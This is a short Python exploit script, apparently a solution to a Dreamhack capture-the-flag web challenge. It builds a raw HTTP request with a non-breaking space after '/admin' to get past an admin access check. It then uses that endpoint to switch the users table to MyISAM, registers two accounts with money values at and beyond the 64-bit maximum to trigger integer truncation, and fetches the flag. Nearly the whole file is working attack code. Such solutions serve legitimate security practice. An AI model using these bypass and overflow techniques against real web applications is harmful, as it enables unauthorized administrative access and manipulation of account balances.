import requests
import socket
import random, string
from urllib.parse import quote

host, port = 'host8.dreamhack.games', 16588
url = f"http://{host}:{port}"
s = requests.Session()

def req_admin(payload):
    payload = payload.encode()

    req = [
        b"POST /admin\xA0 HTTP/1.1",
        f"Host: {host}".encode(),
        b"Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {len(payload)}".encode(),
        b"Connection: close",
    ]

    req = b'\r\n'.join(req) + b'\r\n\r\n' + payload

    s = socket.socket()
    s.connect((host, port))
    s.sendall(req)

    resp = b""
    while True:
        data = s.recv(4096)
        if not data:
            break
        resp += data

    s.close()

    return resp.decode()

# switch storage engine for int truncation
resp = req_admin(f"c=1&new_table_name=users&new_table_option={quote('ENGINE=MYISAM')}")

if "success" in resp.lower():
    print("> Table created")

def get_user():
    return ''.join(random.sample(string.ascii_lowercase, 10))

MAX_INT = 9223372036854775807

res = s.post(f'{url}/register', data={
    'username1': get_user(),
    'password1': 'a',
    'money1': MAX_INT,

    'username2': get_user(),
    'password2': 'a',
    'money2': MAX_INT + 120
})

if "success" in res.text.lower():
    print("> Users registered")

# get flag
res = s.get(f'{url}/flag')
print("Flag:", res.text)